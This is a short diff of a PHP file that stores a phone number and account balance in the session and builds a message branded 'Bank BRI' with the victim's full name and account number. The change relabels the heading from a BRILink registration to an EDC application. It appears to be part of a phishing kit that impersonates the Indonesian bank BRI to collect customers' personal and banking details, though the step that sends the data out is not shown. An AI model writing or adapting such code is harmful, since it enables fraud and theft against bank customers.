@@ -13,9 +13,9 @@ $_SESSION['nomor'] = $nomor;
 $_SESSION['saldo'] = $saldo;
 
 $message = "
-( Bank BRI | DAFTAR BRILink | )
+( Bank BRI | AJUKAN EDC | )
 
-- Nama Lengkap :
+- Nama Lengkap : 
   ".$nama."
 
 - Nomor Rekening :
